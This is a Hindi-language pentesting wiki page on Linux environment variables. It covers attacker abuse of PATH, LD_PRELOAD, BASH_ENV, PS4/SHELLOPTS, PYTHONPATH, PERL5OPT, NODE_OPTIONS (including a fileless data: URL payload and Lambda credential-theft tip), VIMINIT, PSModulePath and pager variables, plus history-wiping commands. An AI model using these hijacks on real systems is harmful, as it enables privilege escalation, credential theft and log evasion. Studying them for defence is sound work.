# Linux पर्यावरण वेरिएबल

{{#include ../../banners/hacktricks-training.md}}

## ग्लोबल वेरिएबल्स

ग्लोबल वेरिएबल्स **चाइल्ड प्रोसेस** द्वारा विरासत में प्राप्त **किए जाएंगे**।

आप अपने वर्तमान सेशन के लिए ग्लोबल वेरिएबल इस तरह बना सकते हैं:

```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```

यह वेरिएबल आपके मौजूदा सेशन्स और उनकी चाइल्ड प्रोसेसेज़ के लिए उपलब्ध होगा।

आप यह करके किसी वेरिएबल को **हटा** सकते हैं:

```bash
unset MYGLOBAL
```

## स्थानीय variables

**स्थानीय variables** को केवल **वर्तमान shell/script** द्वारा **access** किया जा सकता है।

```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```

## वर्तमान variables की सूची

```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```

`/proc/*/environ` की सामग्री **NUL-separated** होती है, इसलिए इन variants को पढ़ना आमतौर पर आसान होता है:

```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```

अगर आप inherited environments के अंदर **credentials** या **interesting service configuration** ढूँढ रहे हैं, तो [Linux Post Exploitation](../post-exploitation/README.md) भी देखें।

## सामान्य variables

स्रोत: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/).<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** द्वारा इस्तेमाल किया जाने वाला display। यह variable आमतौर पर **:0.0** पर सेट होता है, जिसका अर्थ है वर्तमान कंप्यूटर का पहला display।
- **EDITOR** – उपयोगकर्ता का पसंदीदा text editor।
- **HISTFILESIZE** – history file में मौजूद लाइनों की अधिकतम संख्या।
- **HISTSIZE** – उपयोगकर्ता के session समाप्त करने पर history file में जोड़ी जाने वाली लाइनों की संख्या।
- **HOME** – आपकी home directory।
- **HOSTNAME** – कंप्यूटर का hostname।
- **LANG** – आपकी वर्तमान भाषा।
- **MAIL** – उपयोगकर्ता के mail spool का स्थान। आमतौर पर **/var/spool/mail/USER**।
- **MANPATH** – manual pages खोजने के लिए directories की सूची।
- **OSTYPE** – operating system का प्रकार।
- **PS1** – bash में default prompt।
- **PATH** – उन सभी directories के paths संग्रहीत करता है जिनमें वे binary files होती हैं जिन्हें आप file का नाम बताकर चलाना चाहते हैं, न कि relative या absolute path देकर।
- **PWD** – वर्तमान working directory।
- **SHELL** – वर्तमान command shell का path (उदाहरण के लिए, **/bin/bash**)।
- **TERM** – वर्तमान terminal का प्रकार (उदाहरण के लिए, **xterm**)।
- **TZ** – आपका time zone।
- **USER** – आपका वर्तमान username।

## hacking के लिए उपयोगी variables

हर variable समान रूप से उपयोगी नहीं होता। offensive नज़रिए से, उन variables को प्राथमिकता दें जो **search paths**, **startup files**, **dynamic linker behavior**, या **audit/logging** को बदलते हैं।

### **HISTFILESIZE**

**इस variable की value को 0 पर सेट करें**, ताकि जब आप **अपना session समाप्त करें**, तो **history file** (\~/.bash_history) में **0 लाइनें रह जाएँ**।

```bash
export HISTFILESIZE=0
```

### **HISTSIZE**

इस variable की **value को 0 करें**, ताकि commands **in-memory history में न रखे जाएँ** और **history file** (\~/.bash_history) में वापस न लिखे जाएँ।

```bash
export HISTSIZE=0
```

### **HISTCONTROL**

यदि **इस variable का मान `ignorespace` या `ignoreboth` पर सेट है**, तो शुरुआत में अतिरिक्त space वाला कोई भी command history में सेव नहीं होगा।

```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```

### **HISTFILE**

**इतिहास फ़ाइल** को **`/dev/null`** पर सेट करें या इसे पूरी तरह unset कर दें। यह आमतौर पर केवल इतिहास का आकार बदलने से अधिक भरोसेमंद होता है।

```bash
export HISTFILE=/dev/null
unset HISTFILE
```

### http_proxy & https_proxy

प्रोसेस **http या https** के ज़रिए इंटरनेट से कनेक्ट होने के लिए यहाँ घोषित **proxy** का इस्तेमाल करेंगे।

```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```

### all_proxy & no_proxy

- `all_proxy`: उन tools/protocols के लिए default proxy जो इसे मानते हैं।
- `no_proxy`: bypass list (hosts/domains/CIDRs), जिनसे सीधे connect होना चाहिए।

```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```

Tool के अनुसार lowercase और uppercase दोनों variants इस्तेमाल किए जा सकते हैं (`http_proxy`/`HTTP_PROXY`, `no_proxy`/`NO_PROXY`)।

### SSL_CERT_FILE & SSL_CERT_DIR

Processes, **इन env variables** में बताए गए certificates पर भरोसा करेंगे। यह attacker के नियंत्रण वाले CA पर भरोसा करने के लिए **`curl`**, **`git`**, Python HTTP clients या package managers जैसे tools को configure करने में उपयोगी है (उदाहरण के लिए, interception proxy को वैध दिखाने के लिए)।

```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```

### **PATH**

अगर कोई privileged wrapper/script commands को **absolute paths के बिना** चलाता है, तो `PATH` में मौजूद **पहली attacker-controlled directory** को प्राथमिकता मिलती है। यही कई **PATH hijacks** का आधार है, जो `sudo`, cron jobs, shell wrappers और custom SUID helpers में होते हैं। `env_keep+=PATH`, कमज़ोर `secure_path`, या ऐसे wrappers देखें जो `tar`, `service`, `cp`, `python` आदि को नाम से चलाते हैं।

```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```

`PATH` का दुरुपयोग करने वाली privilege-escalation की पूरी chains के लिए, [Linux Privilege Escalation](linux-privilege-escalation/README.md) देखें।

### **HOME & XDG_CONFIG_HOME**

`HOME` सिर्फ़ directory reference नहीं है: कई tools `$HOME` या `$XDG_CONFIG_HOME` से **dotfiles**, **plugins**, और **per-user configuration** अपने-आप load करते हैं। अगर कोई privileged workflow इन values को बनाए रखता है, तो **config injection** binary hijacking से आसान हो सकता है।

```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```

Interesting targets में `.gitconfig`, `.wgetrc`, `.curlrc`, `.inputrc`, `.pythonrc.py`, और `.terraformrc` जैसी tool-specific files शामिल हैं।

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

ये variables **dynamic linker** को प्रभावित करते हैं:

- `LD_PRELOAD`: अतिरिक्त shared objects को सबसे पहले load करने के लिए बाध्य करता है।
- `LD_LIBRARY_PATH`: library search directories को सबसे आगे जोड़ता है।
- `LD_AUDIT`: ऐसी auditor libraries load करता है जो library loading और symbol resolution को observe करती हैं।

अगर कोई privileged command इन्हें बनाए रखता है, तो ये **hooking**, **instrumentation**, और **privilege escalation** के लिए बेहद उपयोगी होते हैं। **Secure-execution** mode (`AT_SECURE`, जैसे setuid/setgid/capabilities) में loader इनमें से कई variables को हटा देता है या उन पर प्रतिबंध लगाता है। हालाँकि, उस शुरुआती loader stage में parser bugs अब भी गंभीर प्रभाव डाल सकते हैं, क्योंकि वे target program से **पहले** चलते हैं।<sup>[[2]](#references)</sup>

```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```

### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` glibc के शुरुआती व्यवहार (उदाहरण के लिए, allocator tunables) को बदलता है और exploit labs में बहुत उपयोगी है। सुरक्षा के नज़रिए से भी यह महत्वपूर्ण है, क्योंकि **dynamic loader इसे बहुत जल्दी parse करता है**। 2023 का **Looney Tunables** bug इस बात की अच्छी याद दिलाता है कि loader में parse किया गया एक environment variable, SUID programs के विरुद्ध **local privilege-escalation primitive** बन सकता है।<sup>[[6]](#references)</sup>

CVE-2023-4911 के लिए, **installed distribution package release** की तुलना उसके vendor की fixed release से करें और पुष्टि करें कि नए processes के लिए वास्तव में कौन-सा loader इस्तेमाल हो रहा है। केवल upstream version string भरोसेमंद नहीं है: Debian ने अपने 2.31 package में प्रभावित parser को backport किया था, जबकि distributions ने upstream number बदले बिना fixes backport किए। व्यावहारिक privilege transition के लिए एक ऐसा executable privileged target भी चाहिए जिसकी identity में बदलाव `NoNewPrivs`, `nosuid` mount या किसी अन्य mitigation से रोका न गया हो। Passive enumeration के दौरान malformed `GLIBC_TUNABLES` crash probe चलाने से बचें। Release के अनुसार लागू होने की जानकारी के लिए [Ubuntu tracker](https://ubuntu.com/security/CVE-2023-4911), [Debian tracker](https://security-tracker.debian.org/tracker/CVE-2023-4911) और [Red Hat advisory](https://access.redhat.com/security/cve/cve-2023-4911) देखें; Ubuntu का [security notice](https://ubuntu.com/security/notices/USN-6409-1) अपडेट के बाद reboot करने की सलाह भी देता है।

```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```

### **BASH_ENV & ENV**

अगर **Bash** को **non-interactively** शुरू किया जाता है, तो वह `BASH_ENV` जाँचता है और target script चलाने से पहले उस फ़ाइल को source करता है। जब Bash को `sh` के रूप में, या POSIX-style interactive mode में invoke किया जाता है, तो `ENV` को भी देखा जा सकता है। अगर environment attacker-controlled हो, तो shell wrapper को code execution में बदलने का यह एक क्लासिक तरीका है।

```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```

Bash इन startup files को तब अनदेखा करता है जब **real/effective IDs अलग-अलग हों**; `-p` effective ID को बनाए रखता है, लेकिन उन startup files को सक्षम नहीं करता, इसलिए सटीक व्यवहार इस बात पर निर्भर करता है कि wrapper shell को कैसे invoke करता है। उन privileged wrappers से सावधान रहें जो Bash लॉन्च करने से **पहले** `setuid()`/`setgid()` कॉल करते हैं: IDs के फिर से मेल खाने पर Bash `BASH_ENV`, `ENV` और संबंधित shell state पर भरोसा कर सकता है, जिन्हें वह अन्यथा अनदेखा करता।<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

Bash में **xtrace** सक्षम होने पर, वह हर traced command से पहले `PS4` को expand करके प्रिंट करता है। `PS4` को prompt की तरह expand किया जाता है, इसलिए उसके अंदर मौजूद **command substitution** execute होता है। अहम बात यह है कि xtrace को सिर्फ environment से `SHELLOPTS=xtrace` export करके चालू किया जा सकता है — command line पर `-x` की ज़रूरत नहीं होती — इसलिए victim द्वारा चलाई गई कोई भी Bash script code execution बन जाती है।<sup>[[7]](#references)</sup>

```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```

`PS4` तब तक कुछ नहीं करता, जब तक xtrace सक्रिय न हो (`SHELLOPTS=xtrace`, `set -x` या `bash -x`); privileged/setuid contexts में Bash, `BASH_ENV` की तरह ही `SHELLOPTS` को हटा देता है।

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP, PYTHONINSPECT & PYTHONBREAKPOINT**

ये variables Python के शुरू होने का तरीका बदलते हैं:

- `PYTHONPATH`: import search paths को सबसे आगे जोड़ता है।
- `PYTHONHOME`: standard library tree का स्थान बदलता है।
- `PYTHONSTARTUP`: interactive prompt से पहले एक file execute करता है।
- `PYTHONINSPECT=1`: script पूरा होने के बाद interactive mode में चला जाता है।
- `PYTHONBREAKPOINT`: जब code `breakpoint()` तक पहुँचता है, तब `package.module.callable` को invoke किया जाता है (और उसका module import किया जाता है)।<sup>[[8]](#references)</sup>

ये उन maintenance scripts, debuggers, shells और wrappers के विरुद्ध उपयोगी हैं, जो controllable environment के साथ Python को call करते हैं। `python -E` और `python -I`, सभी `PYTHON*` variables को अनदेखा करते हैं।

```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```

एक हालिया वास्तविक उदाहरण Ubuntu/Debian systems पर 2024 का **needrestart** LPE था: root-owned scanner ने `/proc/<PID>/environ` से unprivileged process का `PYTHONPATH` कॉपी किया और फिर Python execute किया। प्रकाशित exploit ने attacker-controlled path में `importlib/__init__.so` रखा, ताकि Python अपने initialization के दौरान attacker code execute करे—इससे पहले कि helper की hard-coded script का कोई महत्व होता।<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl में startup के लिए उतने ही उपयोगी variables हैं:

- `PERL5LIB`: library directories को आगे जोड़ें।
- `PERL5OPT`: ऐसे switches inject करें, मानो वे हर `perl` command line पर दिए गए हों।

इससे **automatic module loading** हो सकती है या target script के कुछ भी दिलचस्प करने से पहले interpreter का व्यवहार बदला जा सकता है। **taint / setuid / setgid** contexts में Perl इन variables को अनदेखा करता है, लेकिन सामान्य root-run wrappers, CI jobs, installers और custom sudoers rules के लिए ये अब भी बहुत मायने रखते हैं।

अगर कोई sudo rule environment overrides की अनुमति देता है और उसका privileged command अंततः Perl launch करता है, तो `PERL5DB` की भी जाँच करें। Perl के documentation के अनुसार, `PERL5OPT=-d` debugger शुरू करता है और जब Perl को bare `-d` switch के साथ शुरू किया जाता है, तो `PERL5DB` debugger initialization code देता है। केवल `PERL5LIB` और `PERLLIB` को unset करने से यह रास्ता बंद नहीं होता। इन variables का sudo और wrapper से होकर आगे जाना ज़रूरी है, और Perl process को taint या set-ID handling के कारण इन्हें अनदेखा नहीं करना चाहिए; enumeration के दौरान privileged helper चलाए बिना सटीक rule और execution chain की जाँच करें। [perlrun का environment-variable संदर्भ](https://perldoc.perl.org/perlrun#ENVIRONMENT) देखें।

Perl का built-in [`@INC` search path](https://perldoc.perl.org/perlvar#@INC) भी module की trust boundary है, भले ही environment variables संरक्षित न हों। Privileged Perl process के लिए, किसी वास्तविक `use` या `require` statement का मिलान resolved module name, search order और searched directory में कम privileges वाले user की उस module को बनाने या बदलने की क्षमता से करें। केवल library directory का writable होना यह साबित नहीं करता कि privileged process वहाँ से code load करेगा।

```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```

### **NODE_OPTIONS**

`NODE_OPTIONS` उन सभी `node` प्रक्रियाओं में **Node.js CLI flags** जोड़ता है जिन्हें यह environment विरासत में मिलता है। इसलिए यह उन wrappers, CI jobs, Electron helpers और sudo rules के विरुद्ध उपयोगी है जो अंततः Node को invoke करते हैं। आक्रामक उपयोग के लिए सबसे दिलचस्प flags आमतौर पर ये हैं:

- `--require <file>`: target script से पहले एक CommonJS file को preload करता है।
- `--import <module>`: target script से पहले एक ES module को preload करता है।

Node, `NODE_OPTIONS` में कुछ खतरनाक flags को अस्वीकार करता है, लेकिन `--require` और `--import` को स्पष्ट रूप से अनुमति है और इन्हें नियमित command-line arguments से **पहले** प्रोसेस किया जाता है।<sup>[[4]](#references)</sup>

```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```

#### `data:` URL के साथ Fileless preload

जब आप `NODE_OPTIONS` सेट कर सकते हैं, लेकिन target पर **फ़ाइल नहीं लिख सकते** (read-only filesystem, restricted API, serverless runtime आदि), तो `--import` `data:text/javascript,` URL स्वीकार करता है, इसलिए पूरा payload environment variable के अंदर ही रहता है। JavaScript को **पूरी तरह URL-encoded** होना चाहिए — Node इस value को URL के रूप में parse करता है, इसलिए कोई भी raw space (या अन्य unencoded character) payload को truncate कर देता है और `SyntaxError` देता है। यह Node 20.6+ पर काम करता है, जहाँ `--import`, `NODE_OPTIONS` allowlist में है।<sup>[[4]](#references)</sup>

```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```

> [!TIP]
> **managed cloud runtimes** में `NODE_OPTIONS` के control को RCE में बदलने का यह एक आम तरीका है, जहाँ functions Node चलाते हैं। उदाहरण के लिए, ऐसा attacker जो केवल Lambda की configuration बदल सकता है (`lambda:UpdateFunctionConfiguration`, `iam:PassRole` नहीं, code update नहीं), `NODE_OPTIONS=--import data:text/javascript,<payload>` inject करके function के अंदर code चला सकता है और उसके execution-role credentials चुरा सकता है। Injected module handler से **पहले** चलता है, जिसके बाद handler सामान्य रूप से execute होता है।

`NODE_OPTIONS` को अप्रत्यक्ष रूप से set करने वाली remote gadget chains के लिए (उदाहरण के लिए, RCE के लिए prototype-pollution), [यह दूसरा पेज](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md) देखें।

### **RUBYLIB & RUBYOPT**

Ruby में startup abuse का यही तरीका उपलब्ध है:

- `RUBYLIB`: Ruby के load path में directories को सबसे आगे जोड़ें।
- `RUBYOPT`: हर `ruby` invocation में `-r` जैसे command-line options inject करें।

```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```

2024 की **needrestart** vulnerabilities ने दिखाया कि यह सिर्फ़ lab की trick नहीं है: वही root-owned helper, जो `PYTHONPATH` abuse के प्रति vulnerable था, उसे attacker-controlled `RUBYLIB` के साथ Ruby चलाने के लिए भी मजबूर किया जा सकता था, जिससे attacker की directory से `enc/encdb.so` load होता था।<sup>[[3]](#references)</sup>

### **VIMINIT & EXINIT**

Vim/Neovim सामान्य startup के दौरान `VIMINIT` (या उसके `EXINIT` fallback) में मौजूद Ex commands execute करते हैं। Ex commands में `:!cmd` और `:call system(...)` शामिल हैं, इसलिए इस variable को नियंत्रित करने से जब भी कोई victim Vim खोलता है, code execution हो सकता है (जैसे root के रूप में `sudo vim`, `crontab -e`, `visudo`, या `$EDITOR` को spawn करने वाले `git`/`less`)।<sup>[[9]](#references)</sup>

```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```

Batch mode (`vim -es`/`-Es`) इन variables को छोड़ देता है, लेकिन सामान्य interactive startup में ये चलते हैं।

### **PowerShell (pwsh): PSModulePath, DOTNET_STARTUP_HOOKS & CLR profiler**

PowerShell Core (`pwsh`) Linux/macOS (और Windows) पर चलता है और एक **.NET application** है, इसलिए कई environment variables, inherited environment के साथ किए गए किसी भी `pwsh` invocation को code execution में बदल सकते हैं — cron/systemd jobs, CI runners और उन privileged wrappers के विरुद्ध उपयोगी हैं जो shell से `pwsh` चलाते हैं।

- `PSModulePath`: PowerShell इस सूची की हर directory में `.psd1`/`.psm1` modules को recursively खोजता है और किसी module द्वारा export किए गए command का पहली बार reference होने पर उसे **auto-load** करता है। कोई directory prepend करें, तो import के समय आपके module का top-level code चलता है; चूँकि resolution *Alias → Function → Cmdlet* के क्रम में होता है, इसलिए कोई exported function victim द्वारा चलाए जाने वाले built-in cmdlet को भी shadow कर सकता है।<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`: `powershell/Microsoft.PowerShell_profile.ps1` का स्थान बदलता है, जो startup पर चलता है (`-NoProfile` के अलावा)।
- `DOTNET_STARTUP_HOOKS`: managed assembly, जिसका `StartupHook.Initialize()` `Main` से पहले चलता है (सभी .NET apps में साझा)।
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`: CLR profiling API startup पर attacker की library को process में load करती है (path vars, registry से ज़्यादा प्राथमिकता रखते हैं; `DOTNET_*` नया alias है)। Windows PowerShell 5.1 (.NET Framework) पर `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH` का उपयोग करें। MITRE ATT&CK T1574.012.<sup>[[11]](#references)</sup>

```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```

Windows पर, `PSExecutionPolicyPreference=Bypass` "unsigned scripts blocked" guardrail को भी हटाता है, जिससे planted profile/module वास्तव में run होता है। पूर्ण PoCs के लिए dedicated page देखें:

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

कुछ tools environment से केवल path नहीं पढ़ते; वे value को **shell**, **editor** या **input preprocessor** को देते हैं। इससे ये variables तब खास तौर पर दिलचस्प हो जाते हैं, जब कोई privileged wrapper `git`, `man`, `less` या इसी तरह के text viewers run करता है:

- `PAGER`, `MANPAGER`, `GIT_PAGER`: pager command चुनते हैं।
- `GIT_EDITOR`, `VISUAL`, `EDITOR`: editor command चुनते हैं, अक्सर arguments के साथ।
- `LESSOPEN`, `LESSCLOSE`: ऐसे pre/post-processors तय करते हैं, जो `less` के file खोलने पर run होते हैं।

```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```

Git disk को छुए बिना `GIT_CONFIG_COUNT`, `GIT_CONFIG_KEY_<n>`, और `GIT_CONFIG_VALUE_<n>` के ज़रिए **सिर्फ़ environment में config injection** का भी समर्थन करता है:

```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```

Post-exploitation के नज़रिए से यह भी याद रखें कि inherited environments में अक्सर **credentials**, **proxy settings**, **service tokens**, या **cloud keys** होते हैं। `/proc/<PID>/environ` और `systemd` `Environment=` की hunting के लिए [Linux Post Exploitation](../post-exploitation/README.md) देखें।

### PS1

अपने prompt का रूप बदलें।

[**यह एक उदाहरण है**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: यह एक उदाहरण है](<../images/image (897).png>)

Regular user:

![PERL5OPT & PERL5LIB - PS1: बैकग्राउंड में चल रहे एक, दो और तीन jobs](<../images/image (740).png>)

बैकग्राउंड में चल रहे एक, दो और तीन jobs:

![PERL5OPT & PERL5LIB - PS1: बैकग्राउंड में चल रहे एक, दो और तीन jobs](<../images/image (145).png>)

एक background job, एक रुका हुआ job और आखिरी command सही तरीके से पूरा नहीं हुआ:

![PERL5OPT & PERL5LIB - PS1: एक background job, एक रुका हुआ job और आखिरी command सही तरीके से पूरा नहीं हुआ](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash स्टार्टअप फ़ाइलें](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart में LPEs](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI दस्तावेज़ - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [आम environment variables - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc के ld.so में Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash Manual - Bash Variables (`PS4`) और The Set Builtin (`xtrace`/`SHELLOPTS`)](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - Built-in breakpoint() और PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim दस्तावेज़ - starting.txt (`VIMINIT`, `EXINIT`)](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath और PowerShell module auto-loading](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET debugging और profiling config settings (`CORECLR_`/`DOTNET_`/`COR_` profiler variables)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
